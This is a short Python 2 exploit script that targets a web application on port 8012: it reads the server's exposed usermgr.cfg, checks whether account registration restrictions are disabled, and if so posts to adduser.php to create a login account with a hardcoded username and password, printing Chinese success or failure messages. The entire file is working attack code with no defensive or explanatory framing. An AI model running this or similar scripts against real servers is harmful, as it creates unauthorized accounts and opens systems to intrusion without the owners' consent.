#!/usr/bin/env python
# -*- coding: utf_8 -*-
# author: Tea

import sys
import regex
import requests


def main():
    ipAddress = sys.argv[1]
    defaultPort = '8012'
    if checkAdd(ipAddress, defaultPort):
        userAdd(ipAddress, defaultPort)


def userAdd(ip, port):
    postData = {'nickname': 'mykid', 'username': 'Tea', 'pwd': 'mykid888', 'deptpath': ''}
    userAddContent = requests.post('http://' + ip + ':' + port + '/adduser.php', data=postData).text
    if regex.search('reg_ok.php', userAddContent):
        print u'恭喜!添加账号成功.'
    else:
        print u'抱歉!添加账号失败.'


def checkAdd(ip, port):
    usermgrContent = requests.get('http://' + ip + ':' + port + '/usermgr.cfg')
    refuse_reg_user = regex.search('(?<=refuse_reg_user\s+\=\s+)\d+', usermgrContent.text)[0]
    allow_user_apply_account_direct = \
        regex.search('(?<=allow_user_apply_account_direct\s+\=\s+)\d+', usermgrContent.text)[0]
    if 0 == int(refuse_reg_user) and 0 == int(allow_user_apply_account_direct):
        print u'存在直接添加账号的条件'
        return True
    else:
        print u'默认不能添加可登录账号'
        return False


if __name__ == '__main__':
    main()
